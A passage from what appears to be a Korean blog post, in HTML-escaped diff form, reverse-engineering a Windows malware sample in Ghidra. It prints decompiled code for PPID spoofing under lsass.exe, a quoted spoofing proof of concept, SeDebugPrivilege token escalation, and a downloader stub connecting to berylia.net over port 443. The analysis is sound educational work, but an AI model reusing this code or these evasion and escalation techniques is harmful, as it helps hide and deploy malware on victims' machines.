+      (*UpdateProcThreadAttribute_addr)(local_40,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x20000&lt;/span&gt;,proc_handle,&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;,(PVOID)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,(PSIZE_T)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;);
+      local_84.cb = &lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;;
+      hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+      CreateProcessA_addr = (CreateProcessA *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CreateProcessA&amp;quot;&lt;/span&gt;);
+      FUN_00401570();
+      WVar2 = (*CreateProcessA_addr)
+                        (DAT_00416028,(LPSTR)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,(LPSECURITY_ATTRIBUTES)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,
+                         (LPSECURITY_ATTRIBUTES)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x80010&lt;/span&gt;,(LPVOID)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,(LPCSTR)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,
+                         (LPSTARTUPINFOA)&amp;amp;local_84,(LPPROCESS_INFORMATION)&amp;amp;local_94);
+      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WVar2 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+        uVar4 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+      }
+      &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+        uVar4 = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+      }
+    }
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uVar4;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xBCF4;&amp;#xAE30;&amp;#xAC00; &amp;#xC880; &amp;#xD3B8;&amp;#xD574;&amp;#xC9C4; &amp;#xAC70; &amp;#xAC19;&amp;#xC740; &amp;#xB290;&amp;#xB08C;&amp;#xC774; &amp;#xB4ED;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC804;&amp;#xCCB4;&amp;#xC801;&amp;#xC778; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xD6D1;&amp;#xC5B4;&amp;#xBD24;&amp;#xC744; &amp;#xB54C; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xD0D0;&amp;#xC0C9;&amp;#xC744; &amp;#xD558;&amp;#xBA70; &lt;code&gt;lsass.exe&lt;/code&gt;&amp;#xC640; &amp;#xBE44;&amp;#xAD50;&amp;#xD558;&amp;#xACE0; &amp;#xAC19;&amp;#xC744; &amp;#xC2DC; &amp;#xD574;&amp;#xB2F9; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xC758; ID&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC635;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8; &amp;#xD6C4; &lt;code&gt;FUN_00401b91&lt;/code&gt;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB124;&amp;#xC694;. &amp;#xADF8; &amp;#xD6C4; &amp;#xAC00;&amp;#xC838;&amp;#xC628; &lt;code&gt;lsass.exe&lt;/code&gt;&amp;#xC758; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4; &amp;#xD578;&amp;#xB4E4;&amp;#xC744; &amp;#xC5F4;&amp;#xACE0; &lt;code&gt;IntitializeProcThreaddAttributeList&lt;/code&gt;, &lt;code&gt;UpdateProcThreadAttribute&lt;/code&gt; &amp;#xB4F1;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xB294; &amp;#xAC78; &amp;#xBCF4;&amp;#xC544;&amp;#x2026; &lt;a href=&#34;https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing&#34;&gt;PPID Spoofing&lt;/a&gt;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xAC70; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD574;&amp;#xB2F9; &amp;#xB9C1;&amp;#xD06C;&amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &lt;code&gt;ppid-spoofing.cpp&lt;/code&gt; &amp;#xCF54;&amp;#xB4DC;&amp;#xC640; &amp;#xBE44;&amp;#xAD50;&amp;#xD574;&amp;#xBCFC;&amp;#xAE4C;&amp;#xC694;?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;TlHelp32.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+	STARTUPINFOEXA si;
+	PROCESS_INFORMATION pi;
+	SIZE_T attributeSize;
+	ZeroMemory(&amp;amp;si, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(STARTUPINFOEXA));
+	
+	HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;6200&lt;/span&gt;);
+
+	InitializeProcThreadAttributeList(&lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &amp;amp;attributeSize);
+	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, attributeSize);
+	InitializeProcThreadAttributeList(si.lpAttributeList, &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &amp;amp;attributeSize);
+	UpdateProcThreadAttribute(si.lpAttributeList, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;amp;parentProcessHandle, &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(HANDLE), &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;);
+	si.StartupInfo.cb = &lt;span class=&#34;hljs-keyword&#34;&gt;sizeof&lt;/span&gt;(STARTUPINFOEXA);
+
+	CreateProcessA(&lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, (LPSTR)&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;notepad&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, FALSE, EXTENDED_STARTUPINFO_PRESENT, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &amp;amp;si.StartupInfo, &amp;amp;pi);
+
+	&lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xD568;&amp;#xC218;, &amp;#xD30C;&amp;#xB77C;&amp;#xBBF8;&amp;#xD130;&amp;#xAC00; &amp;#xB3D9;&amp;#xC77C;&amp;#xD55C; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xC2E4; &amp;#xC218; &amp;#xC788;&amp;#xC5B4;&amp;#xC694;. &amp;#xADF8;&amp;#xB7FC; &amp;#xC774; &amp;#xD589;&amp;#xC704;&amp;#xB97C; &amp;#xC65C; &amp;#xD558;&amp;#xB290;&amp;#xB0D0;?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/07/11/idioth/ghidra_part5/Untitled%203.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xB2F9;&amp;#xC5F0;&amp;#xD788; &amp;#xD0D0;&amp;#xC9C0;&amp;#xB97C; &amp;#xD53C;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD574;&amp;#xC11C;! PPID Spoofing&amp;#xC744; &amp;#xD558;&amp;#xBA74; &amp;#xD574;&amp;#xB2F9; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xAC00; &lt;code&gt;lsass.exe&lt;/code&gt;&amp;#xC5D0; &amp;#xC758;&amp;#xD574;&amp;#xC11C; &amp;#xC0DD;&amp;#xC131;&amp;#xB41C; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; &amp;#xBCF4;&amp;#xC774;&amp;#xB3C4;&amp;#xB85D; &amp;#xD558;&amp;#xBBC0;&amp;#xB85C; &amp;#xD0D0;&amp;#xC9C0;&amp;#xB97C; &amp;#xD53C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. (&amp;#xBB3C;&amp;#xB860; &amp;#xD0D0;&amp;#xC9C0; &amp;#xBC29;&amp;#xBC95;&amp;#xB3C4; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC9C0;&amp;#xB9CC;&amp;#xC694;.)&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;CreateProcessA_addr = (CreateProcessA *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CreateProcessA&amp;quot;&lt;/span&gt;);
+      FUN_00401570();
+      WVar2 = (*CreateProcessA_addr)
+                        (DAT_00416028,(LPSTR)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,(LPSECURITY_ATTRIBUTES)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,
+                         (LPSECURITY_ATTRIBUTES)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x80010&lt;/span&gt;,(LPVOID)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,(LPCSTR)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,
+                         (LPSTARTUPINFOA)&amp;amp;local_84,(LPPROCESS_INFORMATION)&amp;amp;local_94);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;PPID Spoofing&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD55C; &amp;#xD6C4;, &amp;#xBC11;&amp;#xC5D0; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xBA74; &lt;code&gt;FUN_00401570&lt;/code&gt;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C; &amp;#xD6C4; &lt;code&gt;CreateProcess&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xBCFC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&amp;#xC815;&amp;#xB9AC;&amp;#xD558;&amp;#xC790;&amp;#xBA74; &amp;#xD574;&amp;#xB2F9; &amp;#xD568;&amp;#xC218;&amp;#xB294; &lt;code&gt;lsass.exe&lt;/code&gt;&amp;#xC758; PID&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC624;&amp;#xACE0; &lt;code&gt;FUN_00401b91&lt;/code&gt;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C; &amp;#xD6C4; PPID Spoofing&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD55C; &amp;#xB4A4; &lt;code&gt;FUN_00401570&lt;/code&gt;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8; &amp;#xD6C4; &lt;code&gt;CreateProcessA&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xCD94;&amp;#xAC00;&amp;#xC801;&amp;#xC778; &amp;#xD504;&amp;#xB85C;&amp;#xC138;&amp;#xC2A4;&amp;#xB97C; &amp;#xC2E4;&amp;#xD589;&amp;#xD558;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
+&lt;p&gt;&amp;#xADFC;&amp;#xB370; &amp;#xC544;&amp;#xAE4C; &amp;#xC704;&amp;#xC5D0;&amp;#xC11C; &amp;#xD655;&amp;#xC778;&amp;#xD588;&amp;#xB358; &amp;#xC8FC;&amp;#xC18C;&amp;#xC640; &lt;code&gt;Wlsass.exe&lt;/code&gt;&amp;#xAC00; &amp;#xC544;&amp;#xC9C1; &amp;#xB098;&amp;#xD0C0;&amp;#xB098;&amp;#xC9C0; &amp;#xC54A;&amp;#xC558;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC74C;&amp;#x2026; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC; &amp;#xAE30;&amp;#xB2A5;&amp;#xC774; &amp;#xCD94;&amp;#xAC00;&amp;#xB418;&amp;#xC5B4;&amp;#xC788;&amp;#xC744; &amp;#xAC83; &amp;#xAC19;&amp;#xC740;&amp;#xB370;? &lt;code&gt;FUN_00401b91&lt;/code&gt;&amp;#xC744; &amp;#xBA3C;&amp;#xC800; &amp;#xD655;&amp;#xC778;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; &amp;#xC5B4;&amp;#xB5A0;&amp;#xD55C; &amp;#xD589;&amp;#xC704;&amp;#xB97C; &amp;#xD558;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xC8E0;!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;token_priv_escalate&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+  HANDLE thread_handle;
+  WINBOOL WVar1;
+  DWORD DVar2;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; iVar3;
+  HANDLE token_handle;
+  ImpersonateSelf *ImpersonateSelf_addr;
+  OpenThreadToken *OpenThreadToken_addr;
+  
+  OpenThreadToken_addr = (OpenThreadToken *)GetProcAddress(DAT_0041601c,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;OpenThreadToken&amp;quot;&lt;/span&gt;);
+  thread_handle = GetCurrentThread();
+  WVar1 = (*OpenThreadToken_addr)(thread_handle,&lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&amp;amp;token_handle);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WVar1 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+    DVar2 = GetLastError();
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (DVar2 != &lt;span class=&#34;hljs-number&#34;&gt;0x3f0&lt;/span&gt;) {
+      &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;
+    }
+    ImpersonateSelf_addr = (ImpersonateSelf *)GetProcAddress(DAT_0041601c,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;ImpersonateSelf&amp;quot;&lt;/span&gt;);
+    WVar1 = (*ImpersonateSelf_addr)(SecurityImpersonation);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WVar1 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+      &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;
+    }
+    thread_handle = GetCurrentThread();
+    WVar1 = (*OpenThreadToken_addr)(thread_handle,&lt;span class=&#34;hljs-number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&amp;amp;token_handle);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WVar1 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+      &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-literal&#34;&gt;false&lt;/span&gt;;
+    }
+  }
+  iVar3 = FUN_00401a9e(token_handle,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;SeDebugPrivilege&amp;quot;&lt;/span&gt;);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (iVar3 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+    CloseHandle(token_handle);
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; iVar3 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC2A4;&amp;#xB808;&amp;#xB4DC; &amp;#xD1A0;&amp;#xD070;&amp;#xC744; &amp;#xAC00;&amp;#xC838;&amp;#xC624;&amp;#xACE0;, Impersonation&amp;#xC744; &amp;#xD558;&amp;#xACE0;&amp;#x2026; &amp;#xAC00;&amp;#xC7A5; &amp;#xACB0;&amp;#xC815;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &lt;code&gt;SeDebugPrivilege&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. Privilege &amp;#xB2E8;&amp;#xC5B4;&amp;#xB9CC; &amp;#xBD10;&amp;#xB3C4; &amp;#xC9D0;&amp;#xC791;&amp;#xC774; &amp;#xB418;&amp;#xB294;&amp;#xAD70;&amp;#xC694;. &amp;#xD760;&amp;#xD760;&amp;#x2026; &amp;#xD574;&amp;#xB2F9; Token Privilege Escalation &amp;#xC778; &amp;#xAC83; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;! SeDebugPrivilege escalation &amp;#xB4F1;&amp;#xC73C;&amp;#xB85C; &amp;#xAD6C;&amp;#xAE00;&amp;#xB9C1;&amp;#xC744; &amp;#xD574;&amp;#xBCF4;&amp;#xBA74;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/07/11/idioth/ghidra_part5/Untitled%204.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens&#34;&gt;https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xD1A0;&amp;#xD070;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xAD8C;&amp;#xD55C; &amp;#xC0C1;&amp;#xC2B9;&amp;#xC744; &amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xBC95;&amp;#xC5D0; &amp;#xB300;&amp;#xD574;&amp;#xC11C; &amp;#xB098;&amp;#xC640; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBC11;&amp;#xC73C;&amp;#xB85C; &amp;#xB0B4;&amp;#xB824;&amp;#xBCF4;&amp;#xBA74;?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/07/11/idioth/ghidra_part5/Untitled%205.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;SeDebugPrivilege&lt;/code&gt;&amp;#xAC00; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/07/11/idioth/ghidra_part5/Untitled%206.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;FUN_00401a9e&lt;/code&gt;&amp;#xB97C; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCF4;&amp;#xBA74; &lt;code&gt;AdjustTokenPrivileges&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC561;&amp;#xC138;&amp;#xC2A4; &amp;#xD1A0;&amp;#xD070;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xAD8C;&amp;#xD55C;&amp;#xC744; &amp;#xC124;&amp;#xC815;&amp;#xD558;&amp;#xB294; &amp;#xAC78; &amp;#xD655;&amp;#xC778;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xADF8;&amp;#xB7EC;&amp;#xBA74; &lt;code&gt;FUN_00401b91&lt;/code&gt; &amp;#xBD80;&amp;#xBD84;&amp;#xC740; Token Privilege escalation&amp;#xC744; &amp;#xD558;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC774;&amp;#xB124;&amp;#xC694;. &amp;#xADF8;&amp;#xB7FC; &amp;#xB2E4;&amp;#xC74C; &amp;#xBD84;&amp;#xC11D;&amp;#xD574;&amp;#xC57C; &amp;#xD560; &amp;#xBD80;&amp;#xBD84;&amp;#xC778; &lt;code&gt;FUN_00401570&lt;/code&gt;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD574;&amp;#xBCFC;&amp;#xAE4C;&amp;#xC694;?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;undefined4 &lt;span class=&#34;hljs-title&#34;&gt;FUN_00401570&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; cVar1;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; bVar2;
+  undefined4 uVar3;
+  HMODULE hModule;
+  WINBOOL WVar4;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;size_t&lt;/span&gt; temp_path_len;
+  undefined4 *puVar5;
+  uint uVar6;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *pcVar7;
+  DWORD local_60;
+  DWORD local_5c;
+  DWORD local_58;
+  uint local_54;
+  InternetCloseHandle *InternetCloseHandle_addr;
+  WriteFile *WriteFile_addr;
+  InternetReadFile *InternetReadFile_addr;
+  HANDLE local_44;
+  CreateFileW *CreateFileW_addr;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;char&lt;/span&gt; *temp_path;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; *local_38;
+  WINBOOL local_34;
+  HttpSendRequestA *HttpSendRequestA_addr;
+  InternetSetOptionW *InternetSetOptionW_addr;
+  InternetQueryOptionW *InternetQueryOptionW_addr;
+  HINTERNET local_24;
+  HttpOpenRequestW *HttpOpenRequestW_addr;
+  HINTERNET local_1c;
+  InternetConnectW *InternetConnectW_addr;
+  HINTERNET local_14;
+  InternetOpenW *InternetOpenW_addr;
+  
+  InternetOpenW_addr = (InternetOpenW *)GetProcAddress(DAT_00416020,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetOpenW&amp;quot;&lt;/span&gt;);
+  local_14 = (*InternetOpenW_addr)(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;WINDOWS&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,(LPCWSTR)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,(LPCWSTR)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (local_14 == (HINTERNET)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;) {
+    uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;0xe&lt;/span&gt;;
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+    hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+    InternetConnectW_addr = (InternetConnectW *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InternetConnectW&amp;quot;&lt;/span&gt;);
+    local_1c = (*InternetConnectW_addr)
+                         (local_14,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;berylia.net&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x1bb&lt;/span&gt;,(LPCWSTR)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,(LPCWSTR)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (local_1c == (HINTERNET)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;) {
+      uVar3 = &lt;span class=&#34;hljs-number&#34;&gt;0xe&lt;/span&gt;;
+    }
+    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+      hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;wininet.dll&amp;quot;&lt;/span&gt;);
+      HttpOpenRequestW_addr = (HttpOpenRequestW *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;HttpOpenRequestW&amp;quot;&lt;/span&gt;);
+      local_24 = (*HttpOpenRequestW_addr)
+                           (local_1c,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;GET&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;/index/&amp;quot;&lt;/span&gt;,(LPCWSTR)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,(LPCWSTR)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,(LPCWSTR *)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,
+                            &lt;span class=&#34;hljs-number&#34;&gt;0x800000&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;);
